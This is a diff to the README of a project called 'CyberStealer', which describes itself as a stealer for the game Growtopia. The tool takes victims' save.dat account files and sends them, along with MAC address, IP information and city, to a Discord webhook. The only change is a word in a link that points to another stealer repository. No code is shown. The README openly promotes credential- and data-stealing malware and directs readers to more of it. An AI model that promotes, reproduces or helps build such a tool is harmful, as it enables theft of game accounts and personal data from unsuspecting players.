@@ -1,7 +1,7 @@
 # CyberStealer
 This is Growtopia stealer save.dat file, Discord Webhook sends a file, mac address, IP info, city, and more...
 <br/>
-Better Version Stealer: https://github.com/TheC0mpany/GrowtopiaStealer
+Other Version Stealer: https://github.com/TheC0mpany/GrowtopiaStealer
 <p>
     <img src="screenshot.png">
 </p>
